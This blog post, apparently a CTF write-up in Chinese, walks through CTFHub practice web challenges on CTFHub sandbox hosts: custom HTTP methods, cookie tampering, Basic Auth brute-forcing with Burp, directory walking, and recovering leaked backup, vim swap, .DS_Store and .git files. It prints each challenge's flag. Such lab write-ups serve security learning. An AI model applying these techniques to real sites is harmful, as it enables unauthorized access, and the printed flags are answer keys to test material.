@@ -1,0 +1,470 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTFHUB-WEB刷题 | Cyberangel's Blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CTFHUB-WEB刷题 边刷题边学知识…  HTTP协议请求方式当客户端与手机端发送请求时会使用到各种各样的HTTP请求方法：  https:&#x2F;&#x2F;www.runoob.com&#x2F;http&#x2F;http-methods.html   其中最常见的就是GET方法和POST方法了，他俩最明显的区别就是在发送请求时前者会在URL中加入参数来请求，后者则是将参数进行了隐藏。当然了除了这九种以外的请求方法还可以进">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTFHUB-WEB刷题">
+<meta property="og:url" content="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8A%E9%97%A8%E9%83%BD%E6%B2%A1%E6%9C%89%E5%85%A5%E7%9A%84WEB%E3%80%8B/CTFHUB-WEB%E5%88%B7%E9%A2%98/index.html">
+<meta property="og:site_name" content="Cyberangel&#39;s Blog">
+<meta property="og:description" content="CTFHUB-WEB刷题 边刷题边学知识…  HTTP协议请求方式当客户端与手机端发送请求时会使用到各种各样的HTTP请求方法：  https:&#x2F;&#x2F;www.runoob.com&#x2F;http&#x2F;http-methods.html   其中最常见的就是GET方法和POST方法了，他俩最明显的区别就是在发送请求时前者会在URL中加入参数来请求，后者则是将参数进行了隐藏。当然了除了这九种以外的请求方法还可以进">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picsum.photos/seed/blog-cover-02/800/450">
+<meta property="article:published_time" content="2022-01-08T04:52:45.000Z">
+<meta property="article:modified_time" content="2026-07-03T14:46:18.793Z">
+<meta property="article:author" content="Cyberangel">
+<meta property="article:tag" content="二进制安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picsum.photos/seed/blog-cover-02/800/450"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTFHUB-WEB刷题",
+  "url": "https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8A%E9%97%A8%E9%83%BD%E6%B2%A1%E6%9C%89%E5%85%A5%E7%9A%84WEB%E3%80%8B/CTFHUB-WEB%E5%88%B7%E9%A2%98/",
+  "image": "https://picsum.photos/seed/blog-cover-02/800/450",
+  "datePublished": "2022-01-08T04:52:45.000Z",
+  "dateModified": "2026-07-03T14:46:18.793Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Cyberangel",
+      "url": "https://elydemiurge.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8A%E9%97%A8%E9%83%BD%E6%B2%A1%E6%9C%89%E5%85%A5%E7%9A%84WEB%E3%80%8B/CTFHUB-WEB%E5%88%B7%E9%A2%98/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.5"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.2.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTFHUB-WEB刷题',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"><link rel="alternate" href="/atom.xml" title="Cyberangel's Blog" type="application/atom+xml">
+</head><body><script>window.paceOptions = {
+  restartOnPushState: false
+}
+
+btf.addGlobalFn('pjaxSend', () => {
+  Pace.restart()
+}, 'pace_restart')
+
+</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/themes/blue/pace-theme-minimal.min.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(https://picsum.photos/seed/blog-cover-02/800/450);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Cyberangel's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">CTFHUB-WEB刷题</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CTFHUB-WEB刷题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-08T04:52:45.000Z" title="发表于 2022-01-08 12:52:45">2022-01-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-07-03T14:46:18.793Z" title="更新于 2026-07-03 22:46:18">2026-07-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/">公开知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8A%E9%97%A8%E9%83%BD%E6%B2%A1%E6%9C%89%E5%85%A5%E7%9A%84WEB%E3%80%8B/">《门都没有入的WEB》</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="CTFHUB-WEB刷题"><a href="#CTFHUB-WEB刷题" class="headerlink" title="CTFHUB-WEB刷题"></a>CTFHUB-WEB刷题</h1><blockquote>
+<p>边刷题边学知识…</p>
+</blockquote>
+<h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h3><p>当客户端与手机端发送请求时会使用到各种各样的HTTP请求方法：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/http/http-methods.html">https://www.runoob.com/http/http-methods.html</a></p>
+</blockquote>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641617741697-8a22fbb9-a722-441d-b780-0c6dcc40a454.png" alt="image.png"></p>
+<p>其中最常见的就是GET方法和POST方法了，他俩最明显的区别就是在发送请求时前者会在URL中加入参数来请求，后者则是将参数进行了隐藏。当然了除了这九种以外的请求方法还可以进行自定义：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641618000052-a1da850a-0a55-46c2-9917-d20fe623c95d.png" alt="image.png"></p>
+<p>环境启动后访问对应的网址：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641618040802-37ed870b-4786-4b8c-92fe-e485c3895c01.png" alt="image.png"></p>
+<p>上面提示我们若使用CTFHUB方法发送请求则会得到flag，这就简单了使用burp进行抓包，然后将下图中的GET方法改为CTFHUB放包即可：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641618211349-8b2b33ba-53b4-4d03-9046-61ace07d7327.png" alt="image.png"></p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641618253881-b326ee30-3251-4ec8-b277-a8ef997b79e9.png" alt="image.png"></p>
+<p><code>ctfhub{90584b6cd1f3a35108e3bf9b}</code></p>
+<blockquote>
+<p>请求方法时区分大小写的，不要写为ctfhub。</p>
+</blockquote>
+<h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>302是HTTP的状态码：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/http/http-status-codes.html">https://www.runoob.com/http/http-status-codes.html</a></p>
+</blockquote>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641618613840-3debd909-9adb-4d71-806c-d2125d3a0ef6.png" alt="image.png"></p>
+<p>3**系列主要用来重定向，其中的302重定向含义为当访问一个URL时会临时跳转到另一个URL上。我们以本题为例。使用浏览器直接访问URL，显示：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641618924273-e02b01a9-ce66-4c57-a804-c9eabf804c63.png" alt="image.png"></p>
+<p>然后我们点击<code>Give me Flag</code>链接，结果还是跳转到了上面这个界面，此时我们查看一下浏览器的网络情况（F12）：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641619117228-4e463247-4caf-4fbc-b39a-c24068c08181.png" alt="image.png"></p>
+<p>发现其访问了一个index.php，在burp中<code>send to repeater</code>进行查看得到flag：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641619244781-7156e8ef-06c5-4115-a4fd-72f5e42cfa89.png" alt="image.png"></p>
+<p><code>ctfhub{25b35cb35cfd14e97e860833}</code></p>
+<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>在维基百科上对cookie的定义如下：<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Cookie">https://zh.wikipedia.org/wiki/Cookie</a></p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641619743315-8eeaad38-c6a4-4a60-a6e6-d5f1bba00c18.png" alt="image.png"></p>
+<p>可以看到cookie的作用之一就是辨别用户身份，但是由于它存放在本地所以在服务器不经校验的情况下我们可以进行越权。开启环境：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641620049183-6ef09195-be48-486a-b21f-b08f79dd5a71.png" alt="image.png"></p>
+<p>上来就提示我们只有admin才能拿到flag，先F12看一波：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641620113760-c5753f16-fbe7-4a4b-91b1-99dcd6be61f1.png" alt="image.png"></p>
+<p>可以看到cookie中admin的值为0，我们将其改为1之后刷新页面即可：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641620184011-2333bb07-ee3b-408a-893b-c4cbf4fd8dc1.png" alt="image.png"></p>
+<p><code>ctfhub{db5ca147f26f7335ff18520f}</code></p>
+<h3 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h3><p>题目提示我们访问<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81">https://zh.wikipedia.org/wiki/HTTP基本认证</a>来获取有关的学习资料，并且还在附件中给我们了一些常见的字典：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641620409020-2fb67636-532b-4607-85ab-0e6c8de653dd.png" alt="image.png"></p>
+<p>看来需要去爆破了，我们访问靶机：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641620459883-045d1a9a-b7d8-46e3-aab0-f0119345ed45.png" alt="image.png"></p>
+<p>点击click发现需要账号密码：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641620543059-a9a243b6-a7d7-4e0c-b42b-26dc40d1edc1.png" alt="image.png"></p>
+<p>使用burp抓包看一下：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641620680806-c937993e-0b41-4d08-bf07-21fb16790d64.png" alt="image.png"></p>
+<p>发现提示要使用admin登录，这个和wiki百科上的相对应：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641620824360-605284de-330b-4c54-861c-82d804a7c186.png" alt="image.png"></p>
+<p>在登录框中输入任意内容，抓包看一下：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641620877603-3bda2b3e-2958-4f0b-ae0e-a2d681fc19a5.png" alt="image.png"></p>
+<p>其中账号密码是使用Base64进行加密<a target="_blank" rel="noopener" href="http://www.hiencode.com/base64.html">http://www.hiencode.com/base64.html</a>：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641620937228-430e8d24-9bd7-4601-a733-00735d72432e.png" alt="image.png"></p>
+<p>这里我们在burp中进行爆破，发送到intruder：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641621051235-4b80925d-0147-4a17-aed9-5ac451c6b704.png" alt="image.png"></p>
+<p>设置变量：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641621330258-f949eb91-37cd-447a-8b47-8ec0e29c341b.png" alt="image.png"></p>
+<p>设置第一个payload为<code>admin:</code>：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641621749677-f4c44487-c183-431d-be7e-c05475633a33.png" alt="image.png"></p>
+<blockquote>
+<p>注意上面是<code>admin:</code>，要与验证格式对应。</p>
+</blockquote>
+<p>第二个payload则是从附件下载的文件中导入：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641621203807-55684e05-0fd9-4a89-a767-e290cc81bcfe.png" alt="image.png"></p>
+<p>设置base64加密：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641621261583-93e3c8b4-21e8-4d17-bb07-3a501132c561.png" alt="image.png"></p>
+<p>最后取消勾选URL编码，防止Base64中的&#x3D;被编码为%3d：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641621943690-97b3badc-b98a-4cd6-8592-5d6064dbe347.png" alt="image.png"></p>
+<p>状态为200，攻击成功：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641621831639-48064d9f-5c99-402a-8c25-1d1804997f09.png" alt="image.png"></p>
+<p><code>YWRtaW46Nzc3Nzc3</code>：即账号密码为<code>admin</code>、<code>777777</code>：<code>ctfhub{ef38e072d6a638f4a5f15f94}</code></p>
+<h3 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h3><p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641622617581-e832d6e5-31b7-4cd6-8a84-8a0d69813bdd.png" alt="image.png"></p>
+<p>按下F12就有flag：<code>ctfhub{f634baeaaf884db3c0e676c3}</code></p>
+<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>直接开启靶机：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641623474292-74a85c4b-0faf-4690-9635-c8787a5241c8.png" alt="image.png"></p>
+<p>可以在<code>flag_in_here/1/3/</code>找到flag.txt：<code>ctfhub{a0aeeed35fc7b17841a6c940}</code></p>
+<p>也可以写一个python脚本帮助我们遍历：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = <span class="string">&quot;http://challenge-b29ac82df5a7b31e.sandbox.ctfhub.com:10800/flag_in_here&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">4</span>):</span><br><span class="line">        request_url=url + <span class="string">&quot;/&quot;</span> +str(i) + <span class="string">&quot;/&quot;</span> + str(j)</span><br><span class="line">        r= requests.get(request_url)</span><br><span class="line">        r.encoding = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">        file = r.text</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;flag.txt&quot;</span> in file):</span><br><span class="line">            print(<span class="string">&quot;success!&quot;</span>)</span><br><span class="line">            print(request_url)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641623991587-9d1fa701-6070-4963-8c8c-b9ab94798b3a.png" alt="image.png"></p>
+<h3 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h3><p>phpinfo里直接有flag：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641624188974-7de6503c-1ae2-4b5c-8f42-c5649e321111.png" alt="image.png"><code>ctfhub{d1e9091c9ecc48886e30947e}</code></p>
+<h3 id="备份文件下载"><a href="#备份文件下载" class="headerlink" title="备份文件下载"></a>备份文件下载</h3><h4 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h4><blockquote>
+<p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
+</blockquote>
+<p>运行环境：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641624711780-2faf913b-fc3a-4732-b113-cddf143c5bac.png" alt="image.png"></p>
+<p>使用后台扫描工具可以有如下连接：<code>http://challenge-f50299f1427c9688.sandbox.ctfhub.com:10800/www.zip</code>，下载解压之后有三个文件</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641626067587-dfa1fea7-998d-4ff4-8ba5-f4f364d80dcb.png" alt="image.png"></p>
+<p>但是没有flag，可以访问<code>网址+flag_298674125.txt</code>得到flag：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641626138239-bd523dca-8f9b-4e58-9849-b993daf9fc47.png" alt="image.png"></p>
+<p><code>ctfhub{7a03d49dd17596948e522b2c}</code></p>
+<h4 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h4><p>访问靶机：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641626262238-b881de10-afb3-474e-9ef5-09cc06421c62.png" alt="image.png"></p>
+<p>尝试访问<code>http://challenge-0f6671e504775379.sandbox.ctfhub.com:10800/index.php</code>无果。因为本题为bak文件，尝试访问：</p>
+<p><code>http://challenge-0f6671e504775379.sandbox.ctfhub.com:10800/index.php.bak</code>得到bak文件，打开即可有flag：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641626395986-51c08987-74fd-462a-b396-aaefb98cfda1.png" alt="image.png"></p>
+<p><code>ctfhub{aed932e9dbb362c6cb36cd9d}</code></p>
+<h4 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h4><p>原来vim也能泄露东西，长见识了…</p>
+<blockquote>
+<p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>
+</blockquote>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641626567103-8c3aae72-ddf2-45dd-ac18-a89aea04aa67.png" alt="image.png"></p>
+<p><strong><span style="color: #E8323C">非正常关闭vim编辑器时会生成一个.swp文件，在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</span></strong></p>
+<p>以 index.php 为例：第一次产生的交换文件名为<code>.index.php.swp</code>，再次意外退出后将会产生名为<code>.index.php.swo</code>的交换文件，第三次产生的交换文件则为<code>.index.php.swn</code>。</p>
+<p>我们访问：<code>http://challenge-021b8c2c341cd8ce.sandbox.ctfhub.com:10800/.index.php.swp</code>下载<code>index.php.swp</code>文件，可以使用<span style="color: rgb(77, 77, 77)"><code>vim -r index.php.swp</code></span>来恢复该文件：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641626817308-636b5110-c700-4240-8368-61cb6b6fb44e.png" alt="image.png"></p>
+<p><code>ctfhub{eeca8a77e438115636796547}</code></p>
+<p>或者可以使用vscode直接打开：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641626915764-ad7092f2-ddc3-4da3-a56f-8f625929a6b8.png" alt="image.png"></p>
+<h4 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h4><blockquote>
+<p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p>
+</blockquote>
+<p>我现在才知道这个文件的作用，之前都没有查过…</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641627095855-cfaf80cf-606a-4ba7-bb08-2298a6ab863e.png" alt="image.png"></p>
+<p>根据提示，访问<code>.DS_Store</code>文件：<code>http://challenge-3ddade604e85492a.sandbox.ctfhub.com:10800/.DS_Store</code>，下载得到DS_Store文件，直接打开是乱码。下载工具<code>Python-dsstore</code>：<a target="_blank" rel="noopener" href="https://github.com/gehaxelt/Python-dsstore">https://github.com/gehaxelt/Python-dsstore</a>，然后进行解析即可：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641627604220-985080f9-8342-4d40-8a6d-c52ba500d852.png" alt="image.png"></p>
+<p>发现文件：<code>62fcf3c8f6deee573952d4acc2d36c60.txt</code>，访问可以得到flag：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641627637048-e540b4fc-b500-4b46-94f7-35b152a3fe23.png" alt="image.png"></p>
+<p><code>ctfhub{4f7e1cd358a7407fc03f1a83}</code></p>
+<h3 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h3><h4 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h4><blockquote>
+<p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题。<br>git我自己之前用过，现在不怎么用了；git目录下包含了大量的信息，若没有部署好则可能泄露。。。</p>
+</blockquote>
+<p>git作用可以看下面的图：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641630300039-d86b5892-8987-4170-84d8-bafffc425440.png" alt="image.png"></p>
+<p>看到题目提示，访问：<a target="_blank" rel="noopener" href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a>下载工具，访问靶机：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641629714513-76cab38b-bed0-41c6-a1ae-c6dbbc2eb03f.png" alt="image.png"></p>
+<p>首先使用工具进行文件泄露（工具要求为python2）：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641630009370-b27bceb0-5971-434a-ba58-1e23b4019014.png" alt="image.png"></p>
+<p>文件保存在如下目录：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641630107518-bd3211bc-158d-4487-9b31-733fda0c95e5.png" alt="image.png"></p>
+<p>如上图所示，git文件夹为隐藏文件夹，在此目录下使用<code>git log</code>查看历史记录：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641630326652-a0ab9b08-b28e-42f0-9f8e-cc4fbacb470b.png" alt="image.png"></p>
